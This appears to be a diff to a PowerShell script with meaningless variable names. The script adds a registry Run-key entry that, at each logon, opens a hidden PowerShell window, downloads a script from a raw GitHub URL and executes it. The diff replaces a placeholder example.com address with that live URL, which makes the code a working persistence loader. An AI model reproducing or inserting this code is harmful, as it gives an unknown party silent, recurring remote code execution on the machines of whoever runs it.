@@ -1,6 +1,6 @@
 $fqwl = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $ghbp = "startps"
-$mnxc = 'powershell.exe -WindowStyle Hidden -Command "irm https://example.com/script.ps1 | iex"'
+$mnxc = 'powershell.exe -WindowStyle Hidden -Command "irm https://raw.githubusercontent.com/egigesajaz080-dot/skdbcdsch/refs/heads/main/jsdkbfj.ps1 | iex"'
 
 if (-not (Get-ItemProperty -Path $fqwl -Name $ghbp -ErrorAction SilentlyContinue)) {
     Set-ItemProperty -Path $fqwl -Name $ghbp -Value $mnxc | Out-Null
